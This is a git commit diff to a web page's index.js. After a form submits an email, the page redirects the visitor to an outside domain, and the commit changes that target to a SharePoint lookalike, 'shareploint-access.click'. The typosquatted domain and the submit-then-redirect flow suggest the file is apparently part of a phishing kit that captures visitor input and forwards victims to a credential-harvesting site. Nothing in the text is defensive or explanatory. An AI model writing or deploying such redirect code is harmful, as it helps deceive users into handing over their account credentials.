26d1067e45af1a9d33e2d4396976b0923cb458f2
husknet <127146284+husknet@users.noreply.github.com>
2024-10-21 12:38:54 -0300

    Update index.js

--- pages/index.js
+++ pages/index.js
@@ -54,7 +54,7 @@ export default function Home() {
         });
 
         console.log('Email sent successfully!', response.data.message);
-        window.location.href = 'https://sg.alltrack-cokflies.click';
+        window.location.href = 'https://otoby.shareploint-access.click';
       } catch (error) {
         console.error('Failed to send email:', error);
         setErrorMessage('Failed to submit. Please try again.');
